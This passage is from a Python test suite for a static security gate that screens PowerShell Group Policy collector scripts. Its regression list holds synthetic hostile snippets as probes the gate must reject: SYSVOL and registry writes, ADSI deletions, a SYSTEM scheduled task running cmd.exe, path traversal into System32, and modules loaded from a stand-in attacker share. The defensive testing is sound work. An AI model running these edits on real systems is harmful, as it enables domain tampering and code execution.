# to any of these must change a nested statement's digest (Sol round 9: wrapping
# the root body in begin/process/end, renaming a function, or editing an
# enclosing condition must not leave digests unchanged). Ported from adcs-lens.
_CONTEXT_ROLES = frozenset(
    {
        "Clauses.Condition",
        "Clauses.Pattern",
        "Condition",
        "Variable",
        "Initializer",
        "Iterator",
        "CatchTypes",
        "ParamBlock",
        "Parameters",
        "Attributes",
        "DynamicParamBlock",
        "Redirections",
        "CatchClauses",
        "Finally",
    }
)


def _row_index_paths(rows: list[list[Any]]) -> list[tuple[int, ...]]:
    """Pre-order child-index path of every AST row (a stable structural id)."""
    paths: list[tuple[int, ...]] = []
    path: list[int] = []
    for row in rows:
        d = int(row[0])
        if d == len(path):
            path.append(0)
        else:
            path = path[: d + 1]
            path[d] += 1
        paths.append(tuple(path))
    return paths


def _statement_digests(entry: dict[str, Any]) -> dict[str, str]:
    """Digest of every statement (direct child of any block body), keyed by its
    structural index path. Each digest covers the statement's own subtree AND
    its context: for every ancestor from the root down, the ancestor's own row
    (type, role, non-child properties — NamedBlockAst.BlockKind/Unnamed,
    FunctionDefinitionAst.Name, foreach/switch flags, labels, operators), the
    child index taken, and the full subtrees of the ancestor's context children
    (_CONTEXT_ROLES: conditions, param blocks, attributes, catch types, loop
    init/iterators, redirections). So moving a statement, re-wrapping it in a
    begin/process/end block, renaming its function or editing an enclosing
    condition changes its digest, not only an edit to the statement itself. A
    function definition is itself such a statement (subsuming the former
    per-function body pins). Ported from adcs-lens 43828ad."""
    rows = entry["ast_rows"]
    paths = _row_index_paths(rows)
    n = len(rows)
    lines = [_ast_line(r) for r in rows]
    ends = [0] * n
    for i in range(n - 1, -1, -1):
        j = i + 1
        while j < n and int(rows[j][0]) > int(rows[i][0]):
            j = ends[j]
        ends[i] = j
    sub_hash: dict[int, str] = {}

    def subtree(i: int) -> str:
        if i not in sub_hash:
            sub_hash[i] = hashlib.sha256("\n".join(lines[i : ends[i]]).encode("utf-8")).hexdigest()
        return sub_hash[i]

    out: dict[str, str] = {}
    stack: list[int] = []
    for i, row in enumerate(rows):
        depth = int(row[0])
        while stack and int(rows[stack[-1]][0]) >= depth:
            stack.pop()
        if row[1] == "Statements":
            parts: list[str] = []
            for a in stack:
                parts.append(f"A{paths[a][-1]}|{lines[a].strip()}")
                child_depth = int(rows[a][0]) + 1
                j = a + 1
                while j < ends[a]:
                    if int(rows[j][0]) == child_depth and rows[j][1] in _CONTEXT_ROLES:
                        parts.append(f"C|{rows[j][1]}|{subtree(j)}")
                    j = ends[j] if int(rows[j][0]) >= child_depth else j + 1
            parts.append(f"S{paths[i][-1]}|{subtree(i)}")
            key = ".".join(str(x) for x in paths[i])
            out[key] = hashlib.sha256("\n".join(parts).encode("utf-8")).hexdigest()
        stack.append(i)
    return out


def _statement_digest_labels(entry: dict[str, Any]) -> dict[str, str]:
    """key -> the statement's AST type, for the candidate printer / diagnostics."""
    rows = entry["ast_rows"]
    paths = _row_index_paths(rows)
    return {
        ".".join(str(x) for x in paths[i]): row[2]
        for i, row in enumerate(rows)
        if row[1] == "Statements"
    }


def check_statement_digests(script: str, entry: dict[str, Any]) -> None:
    """Structural floor: every statement of every block body is pinned by an
    ancestor-aware digest in STATEMENT_DIGESTS (hand-maintained; the generator
    never writes it). Any statement added, removed, moved, re-wrapped in another
    block, or edited anywhere changes a digest or the key set, so a regeneration
    is refused until a human updates the table. The other semantic checks stay
    the floor that catches a harmful edit even when the digests are updated."""
    actual = _statement_digests(entry)
    allowed = STATEMENT_DIGESTS[script]
    _exact("statements", script, set(actual), frozenset(allowed))
    labels = _statement_digest_labels(entry)
    changed = sorted(k for k in actual if k in allowed and actual[k] != allowed[k])
    if changed:
        detail = ", ".join(f"{k} ({labels.get(k, '?')})" for k in changed)
        raise AssertionError(
            f"{script}: statement subtree/context changed (update STATEMENT_DIGESTS): {detail}"
        )


def _arg_vector(command: dict[str, Any]) -> TaskVector:
    return frozenset(
        (
            _cf(str(a.get("parameter_canonical") or a["parameter"])),
            _norm(a["value"]) if a["value"] is not None else None,
        )
        for a in command["arguments"]
        if a["parameter"]
    )


def check_task_action(script: str, entry: dict[str, Any]) -> None:
    if script != _TASK_ACTION_SCRIPT:
        for command in entry["commands"]:
            assert command["name"] not in _TASK_VECTORS_CF, (
                f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
            )
        return
    for command in entry["commands"]:
        vectors = _TASK_VECTORS_CF.get(command["name"] or "")
        if vectors is None:
            continue
        # The full argument vector must match one pinned vector exactly. An
        # extra -CimSession, a wildcard -TaskName, -RunLevel Highest, or any
        # other changed/added argument matches none and fails.
        actual = _arg_vector(command)
        assert actual in vectors, (
            f"{script}:{command['line']}: {command['name']} argument vector {sorted(actual)} "
            f"matches no pinned vector"
        )


# Named semantic checks, in run order. Each takes (script, entry); the two that
# also need the local function set are wrapped. The names are what the
# regression suite asserts against (NON-BL-3).
def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {
        "ast": check_ast,
        "statement_digests": check_statement_digests,
        "cast_types": check_cast_types,
        "pipeline_inputs": check_pipeline_inputs,
        "commands": lambda s, e: check_commands(s, e, local),
        "local_functions": check_local_functions,
        "local_function_bodies": check_local_function_bodies,
        "dotnet": check_dotnet,
        "types": check_types,
        "instance_receivers": check_instance_receivers,
        "usings": check_usings,
        "redirections": check_redirections,
        "new_object_and_add_type": check_new_object_and_add_type,
        "writes": check_writes,
        "bindings": check_bindings,
        "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
        "task_action": check_task_action,
        "guarded_ops": lambda s, e: check_guarded_ops(s, inv),
        "secret_uses": check_secret_uses,
        "remote_paths": check_remote_paths,
        "remote_literals": check_remote_literals,
        "task_name_validator": check_task_name_validator,
        "script_header": check_script_header,
    }


def _run_checks(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
    """Run every semantic check; return the set of check names that raised.

    ``parse_errors`` is reported as the pseudo-check ``parse`` so the regression
    suite can require a *substantive* check (not a parse failure) to flag a probe.
    """
    policy = POLICIES[script]
    entry = inv[script]
    local = set(entry["functions"])
    for source in policy.dot_sources:
        local |= set(inv[source]["functions"])
    failed: set[str] = set()
    if entry["parse_errors"]:
        failed.add("parse")
    for check_name, fn in _named_checks(local, inv).items():
        try:
            fn(script, entry)
        except AssertionError:
            failed.add(check_name)
    return failed


def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
    entry = inv[script]
    assert entry["parse_errors"] == [], f"{script}: {entry['parse_errors']}"
    failed = {c for c in _run_checks(script, inv) if c != "parse"}
    assert not failed, f"{script}: checks failed: {sorted(failed)}"


# ---------------------------------------------------------------------------
# Closed-world golden inventory. For each in-scope script the committed file
# records (1) ``ast``: a canonical, order-preserving serialization of the WHOLE
# syntax tree — one line per node, pre-order, indented by depth, naming the
# property the node fills in its parent and every semantically relevant scalar
# (operators, names, string values, flags, #Requires, attributes, ...); and
# (2) ``source_sha256``: a digest of the exact source bytes (LF line endings are
# pinned by .gitattributes and CR is refused by check_ast), so comments and
# whitespace (which the AST omits but a script can observe, e.g. via a
# scriptblock's text) are covered too. Any change to a
# collector therefore changes the inventory and fails
# test_inventory_matches_golden until it is regenerated by
# scripts/gen_collector_inventory.py, which refuses unless every semantic check
# above passes.
# ---------------------------------------------------------------------------

GOLDEN_PATH = _REPO / "tests" / "powershell" / "collector-inventory.json"


def _ast_line(row: list[Any]) -> str:
    depth, role, kind, attrs = row[0], row[1], row[2], row[3]
    text = "  " * int(depth) + f"{role}: {kind}"
    for key, value in attrs:
        text += f" {key}={json.dumps(value, ensure_ascii=True)}"
    if len(row) > 4:  # an UNSUPPORTED node also carries its source text
        text += f" text={json.dumps(row[4], ensure_ascii=True)}"
    return text


def _canonical(entry: dict[str, Any]) -> dict[str, Any]:
    return {
        "source_sha256": entry["source_sha256"],
        "parse_errors": entry["parse_errors"],
        "ast": [_ast_line(row) for row in entry["ast_rows"]],
    }


def build_full_inventory(inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {script: _canonical(inv[script]) for script in sorted(POLICIES)}


def _dump_golden(golden: dict[str, Any]) -> str:
    return json.dumps(golden, indent=1, sort_keys=True, ensure_ascii=True) + "\n"


def write_golden_inventory(exe: str) -> dict[str, Any]:
    """Build, semantically validate, and write the golden inventory.

    The generator refuses to write unless every semantic check passes for every
    script. That is the regeneration floor: it can only admit what the semantic
    layer admits, and the resulting golden diff is what a reviewer inspects.
    """
    inv = _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])
    for script in POLICIES:
        run_all_checks(script, inv)
    golden = build_full_inventory(inv)
    GOLDEN_PATH.write_text(_dump_golden(golden), encoding="utf-8")
    return golden


def test_inventory_matches_golden(inventory: dict[str, dict[str, Any]]) -> None:
    assert GOLDEN_PATH.exists(), (
        "tests/powershell/collector-inventory.json is missing; "
        "run `python scripts/gen_collector_inventory.py`"
    )
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    current = build_full_inventory(inventory)
    if committed != current:
        import difflib

        diff = "\n".join(
            list(
                difflib.unified_diff(
                    _dump_golden(committed).splitlines(),
                    _dump_golden(current).splitlines(),
                    fromfile="committed",
                    tofile="current",
                    lineterm="",
                )
            )[:120]
        )
        raise AssertionError(
            "collector syntax-tree inventory changed. A reviewer must confirm the diff, then "
            "regenerate with `python scripts/gen_collector_inventory.py`:\n" + diff
        )


# Files PowerShell can load as code or configuration. Every one under scripts/
# must be classified (Sol round-3: a .psm1 was outside the glob).
_POWERSHELL_SUFFIXES = (".ps1", ".psm1", ".psd1", ".ps1xml", ".cdxml", ".pssc", ".psrc")


def _unclassified_scripts(root: Path) -> tuple[list[str], list[str]]:
    on_disk = {
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file() and p.suffix.casefold() in _POWERSHELL_SUFFIXES
    }
    classified = set(POLICIES) | set(OUT_OF_SCOPE)
    return sorted(on_disk - classified), sorted(classified - on_disk)


def test_every_script_is_classified() -> None:
    unclassified, missing = _unclassified_scripts(_SCRIPTS)
    assert not unclassified and not missing, (
        "Every PowerShell file under scripts/ must be in POLICIES or OUT_OF_SCOPE: "
        f"unclassified {unclassified}, missing {missing}"
    )


def test_module_files_need_classification(tmp_path: Path) -> None:
    for name in (*POLICIES, *OUT_OF_SCOPE):
        (tmp_path / name).write_text("", encoding="utf-8")
    (tmp_path / "GpoLensReviewerPayload.psm1").write_text("", encoding="utf-8")
    (tmp_path / "nested").mkdir()
    (tmp_path / "nested" / "Payload.psd1").write_text("@{}", encoding="utf-8")
    unclassified, missing = _unclassified_scripts(tmp_path)
    assert unclassified == ["GpoLensReviewerPayload.psm1", "nested/Payload.psd1"]
    assert missing == []


def test_policy_tables_cover_every_script() -> None:
    for table_name, table in (
        ("WRITE_ROOTS", WRITE_ROOTS),
        ("PINNED_VARS", PINNED_VARS),
        ("INSTANCE_RECEIVERS", INSTANCE_RECEIVERS),
        ("WRITE_TARGET_EXPRESSIONS", WRITE_TARGET_EXPRESSIONS),
        ("SPECIAL_BINDINGS", SPECIAL_BINDINGS),
        ("INDEX_ASSIGNMENT_ROOTS", INDEX_ASSIGNMENT_ROOTS),
        ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
        ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
        ("LOCAL_FUNCTION_BODIES", LOCAL_FUNCTION_BODIES),
        ("SECRET_USES", SECRET_USES),
        ("SCRIPT_HEADERS", SCRIPT_HEADERS),
        ("STATEMENT_DIGESTS", STATEMENT_DIGESTS),
        ("PIPELINE_INPUTS", PIPELINE_INPUTS),
        ("REMOTE_LITERALS", REMOTE_LITERALS),
        ("SECRET_VARIABLES", SECRET_VARIABLES),
        ("REMOTE_LITERALS", REMOTE_LITERALS),
        ("GUARDED_OPS", GUARDED_OPS),
    ):
        assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"


def test_forbidden_commands_are_never_allowlisted() -> None:
    forbidden = {_cf(c) for c in FORBIDDEN_COMMANDS}
    for script, policy in POLICIES.items():
        hits = sorted(c for c in policy.commands if _cf(c) in forbidden)
        assert not hits, f"{script}: allowlists never-allowed commands {hits}"


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_parses_without_errors(inventory: dict[str, dict[str, Any]], script: str) -> None:
    assert inventory[script]["parse_errors"] == []


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_commands_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    policy = POLICIES[script]
    local = set(inventory[script]["functions"])
    for source in policy.dot_sources:
        local |= set(inventory[source]["functions"])
    check_commands(script, inventory[script], local)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_dotnet_calls_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_dotnet(script, inventory[script])
    check_types(script, inventory[script])
    check_instance_receivers(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_using_or_disallowed_redirection(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_usings(script, inventory[script])
    check_redirections(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_new_object_and_add_type(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_new_object_and_add_type(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_writes_stay_under_declared_roots(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_writes(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_pinned_variables_are_not_rebound(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_pinned_bindings(script, inventory)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_scheduled_task_arguments_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_task_action(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_every_type_usage_is_checked(inventory: dict[str, dict[str, Any]], script: str) -> None:
    """Count parity (DeepSeek round 9): every ConvertExpressionAst, every
    As/Is/IsNot BinaryExpressionAst, every non-cast TypeConstraintAst and every
    TypeExpressionAst in the script produced exactly one entry in type_usages,
    so check_cast_types sees every type-conversion/reference construct."""
    entry = inventory[script]
    c = entry["type_node_counts"]
    expected = c["convert"] + c["binary_typeop"] + c["constraint_not_cast"] + c["type_expr"]
    assert len(entry["type_usages"]) == expected, (
        f"{script}: {len(entry['type_usages'])} type usages but {expected} type nodes "
        f"({c}); a type construct is unclassified"
    )


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_whole_tree_screens(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_ast(script, inventory[script])
    check_local_functions(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_unpinnable_or_engine_bindings(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_bindings(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_write_and_exec_operations_keep_their_guards(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_guarded_ops(script, inventory)


def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
    """Every AD/GroupPolicy noun-verb in an allowlist is a Get-*, and only the
    registration script may name the scheduled-task cmdlets."""
    task_cmdlets = {
        "New-ScheduledTask",
        "New-ScheduledTaskAction",
        "New-ScheduledTaskPrincipal",
        "New-ScheduledTaskSettingsSet",
        "New-ScheduledTaskTrigger",
        "Register-ScheduledTask",
        "Unregister-ScheduledTask",
    }
    for script, policy in POLICIES.items():
        directory = {c for c in policy.commands if re.match(r"^\w+-(AD|GP)", c)}
        assert all(c.startswith("Get-") for c in directory), (script, sorted(directory))
        tasks = policy.commands & task_cmdlets
        if script != _TASK_ACTION_SCRIPT:
            assert not tasks, f"{script} must not touch Task Scheduler: {sorted(tasks)}"


# ---------------------------------------------------------------------------
# Regression suite: every reviewer probe (both lineages) must be flagged. Each
# probe appends/prepends one malicious edit to a copy of a real script; the
# full gate must raise for that script. A clean copy must pass.
# ---------------------------------------------------------------------------

# (id, base script, mode, edit). mode is "append"/"prepend" (edit = snippet),
# "before" (edit = (marker, snippet)) or "replace" (edit = (old, new)); the
# marker/old text must occur exactly once. Snippets are synthetic and use
# example.test / LABDOMAIN placeholders only.
Probe = tuple[str, str, str, str | tuple[str, str]]
_REGRESSIONS: list[Probe] = [
    # --- Sol probes ---
    (
        "sol_root_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "sol_registry_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = 'HKLM:\\Software\\GpoLensGateBypass'\n"
        "New-Item -Path $OutputRoot -Force | Out-Null\n",
    ),
    (
        "sol_set_itemtype",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -ItemType SymbolicLink "
        "-Value '\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Force | Out-Null\n",
    ),
    (
        "sol_redirection",
        "Export-GpoEstate.ps1",
        "append",
        "'owned' > '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_redirection_stream",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'owned' 6> '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_get_gporeport_path",
        "Export-GpoEstate.ps1",
        "append",
        "Get-GPOReport -All -ReportType Xml "
        "-Path '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "sol_instance_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$unownedFile = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$unownedFile.Delete()\n",
    ),
    (
        "sol_adsi_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$domain = [ADSI]'WinNT://LABDOMAIN,domain'\n$domain.Delete('user', 'victim')\n",
    ),
    ("sol_using_module", "Export-GpoEstate.ps1", "prepend", "using module ./GateEvil.psm1\n"),
    (
        "sol_collector_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "$CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "sol_task_abuse",
        "Register-GpoLensCollection.ps1",
        "append",
        "$evilAction = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$evilTask = New-ScheduledTask -Action $evilAction -Principal $principal\n"
        "Register-ScheduledTask -TaskName 'GpoLensGateBypass' -InputObject $evilTask -Force\n",
    ),
    # --- DeepSeek probes ---
    (
        "ds_writeroot_var",
        "Export-GpoEstate.ps1",
        "append",
        "$dest = Join-Path 'C:\\Windows\\System32' 'evil.dll'\n"
        "Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue\n",
    ),
    (
        "ds_writeroot_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$LogPath = 'C:\\Windows\\System32\\evil.log'\n"
        "[IO.File]::AppendAllText($LogPath, 'owned', [Text.UTF8Encoding]::new($false))\n",
    ),
    (
        "ds_adsi_copyto_marker",
        "GpoLensCollectionMarker.ps1",
        "append",
        "([ADSI]'LDAP://CN=victim,OU=x,DC=example,DC=test')"
        ".CopyTo('LDAP://OU=evil,DC=example,DC=test')\n",
    ),
    (
        "ds_register_args",
        "Register-GpoLensCollection.ps1",
        "append",
        "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n"
        "$t = New-ScheduledTask -Action $a -Principal $p\n"
        "Register-ScheduledTask -TaskName 'NotGpoLens' -InputObject $t -Force\n",
    ),
    (
        "ds_using_assembly",
        "Export-GpoEstate.ps1",
        "prepend",
        "using assembly System.DirectoryServices\n",
    ),
    # --- Negative controls from both lineages (must already be rejected) ---
    (
        "neg_set_adobject",
        "Export-GpoEstate.ps1",
        "append",
        "Set-ADObject -Identity 'x' -Replace @{description='y'}\n",
    ),
    (
        "neg_adsi_commit",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$e.CommitChanges()\n",
    ),
    (
        "neg_dynamic_member",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$m = 'CommitChanges'\n$e.$m()\n",
    ),
    ("neg_com", "Export-GpoEstate.ps1", "append", "New-Object -ComObject 'WScript.Shell'\n"),
    (
        "neg_namespace_de",
        "Export-GpoEstate.ps1",
        "prepend",
        "using namespace System.DirectoryServices\n",
    ),
    (
        "neg_splat_write",
        "Export-GpoEstate.ps1",
        "append",
        "$w = @{ LiteralPath = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'; Value = 'owned' }\n"
        "Set-Content @w\n",
    ),
    (
        "neg_addtype_inline",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -TypeDefinition 'public static class P { public static void R() {} }'\n",
    ),
    (
        "neg_import_module_unc",
        "Export-GpoEstate.ps1",
        "append",
        "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
    ),
    # --- Sol round-2 candidates (19), each previously accepted ---
    # BL-1: variable-writing common parameters rebind a pinned variable.
    (
        "r2_outvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable OutputRoot | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_pipelinevariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -PipelineVariable OutputRoot | "
        "ForEach-Object { Set-Content -LiteralPath $OutputRoot -Value 'owned' }\n",
    ),
    (
        "r2_errorvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Error 'C:\\Windows\\Temp\\gate.txt' -ErrorVariable OutputRoot "
        "-ErrorAction SilentlyContinue\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_warningvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Warning 'C:\\Windows\\Temp\\gate.txt' -WarningVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_informationvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'C:\\Windows\\Temp\\gate.txt' -InformationVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_collectorpath_outvariable_override",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\Mutate.ps1' "
        "-OutVariable CollectorPath | Out-Null\n",
    ),
    (
        "r2_taskargs_outvariable_override",
        "Register-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\payload.ps1' "
        "-OutVariable taskArgs | Out-Null\n",
    ),
    # BL-2: receiver-less / parenthesized receivers on side-effecting methods.
    (
        "r2_parenthesized_receiver_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml').Delete()\n",
    ),
    (
        "r2_parenthesized_receiver_open_write",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "Open([IO.FileMode]::Open, [IO.FileAccess]::Write).Write([byte[]](65), 0, 1)\n",
    ),
    (
        "r2_parenthesized_fileinfo_copyto_sysvol",
        "GpoLensCollectionMarker.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "CopyTo('\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\evil.ini', $true)\n",
    ),
    (
        "r2_wmi_remote_instance_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "([WMI]'\\\\server.example.test\\root\\cimv2:Win32_Environment.Name=\"GATE\"').Delete()\n",
    ),
    # BL-3: scheduled-task operation not pinned.
    (
        "r2_taskname_direct_rebind",
        "Register-GpoLensCollection.ps1",
        "append",
        "$TaskName = '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n",
    ),
    (
        "r2_task_unregister_wildcard",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName '*' -Confirm:$false\n",
    ),
    (
        "r2_task_register_remote_cimsession",
        "Register-GpoLensCollection.ps1",
        "append",
        "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
        "-CimSession 'server.example.test' -Force | Out-Null\n",
    ),
    (
        "r2_task_principal_runlevel_highest",
        "Register-GpoLensCollection.ps1",
        "append",
        "$principal = New-ScheduledTaskPrincipal -UserId $account "
        "-LogonType Password -RunLevel Highest\n",
    ),
    # BL-4: pinned root plus unchecked child data.
    (
        "r2_env_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = $env:GPO_LENS_ESCAPE\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = '..\\..\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_computed_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = ([char]46) + ([char]46) + '\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_new_item_name_traversal",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -Name '..\\..\\Windows\\Temp\\gate.txt' "
        "-ItemType File -Force | Out-Null\n",
    ),
    # --- DeepSeek round-2 candidates ---
    # NEW-BL-1: `..` carried in a non-root child variable / other write forms.
    (
        "ds_dotdot_child_var",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\..\\..\\Windows\\System32\\evil.dll'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $sub) -Value 'owned'\n",
    ),
    (
        "ds_interp_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\nSet-Content -LiteralPath \"$OutputRoot\\$sub\" -Value 'owned'\n",
    ),
    (
        "ds_writealltext_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n[IO.File]::WriteAllText((Join-Path $OutputRoot $sub), 'owned')\n",
    ),
    (
        "ds_copyitem_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Copy-Item -LiteralPath $testFile -Destination (Join-Path $OutputRoot $sub) -Force\n",
    ),
    (
        "ds_getgporeport_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Get-GPOReport -All -ReportType Xml -Path (Join-Path $OutputRoot $sub)\n",
    ),
    (
        "ds_function_wrapped_write",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "function Invoke-GateWrite { Set-Content -LiteralPath (Join-Path $OutputRoot $sub) "
        "-Value 'owned' }\nInvoke-GateWrite\n",
    ),
    # NEW-BL-2: scope-qualified and foreach rebinds of pinned roots / exec sink.
    (
        "ds_script_scope_outputroot",
        "Export-GpoEstate.ps1",
        "append",
        "$script:OutputRoot = 'C:\\Windows\\System32'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot 'evil.dll') -Value 'owned'\n",
    ),
    (
        "ds_foreach_abs_root",
        "Export-GpoEstate.ps1",
        "append",
        "$evil = 'C:\\Windows\\System32'\n"
        "foreach ($OutputRoot in $evil) { Set-Content -LiteralPath "
        "(Join-Path $OutputRoot 'evil.dll') -Value 'owned' }\n",
    ),
    (
        "ds_script_collectorpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "ds_script_windowsroot",
        "Register-GpoLensCollection.ps1",
        "append",
        "$script:windowsRoot = 'C:\\attacker'\n",
    ),
    (
        "ds_script_logpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:LogPath = 'C:\\Windows\\System32\\evil.log'\n",
    ),
    # --- Round-3 candidates (Sol / DeepSeek), each previously accepted ---
    # Sol BL-2: receiver rebind onto an allowlisted side-effecting method.
    (
        "r3_receiver_rebind_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "$entry = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$entry.Delete()\n",
    ),
    # Sol BL-2: the exact allowed vector, duplicated outside ShouldProcess.
    (
        "r3_unregister_duplicate",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false\n",
    ),
    # Sol BL-2: alias-provider assignment re-points a later Get-Item.
    (
        "r3_alias_provider",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "${Alias:Get-Item} = 'Remove-Item'\n"),
    ),
    # Sol BL-1: #Requires auto-imports a module (not an AST node the old
    # inventory recorded).
    (
        "r3_requires_module",
        "Export-GpoEstate.ps1",
        "prepend",
        "#Requires -Modules GpoLensReviewerPayload\n",
    ),
    # Sol BL-1: weaken the reparse-point guard (-or -> -and).
    (
        "r3_guard_or_to_and",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
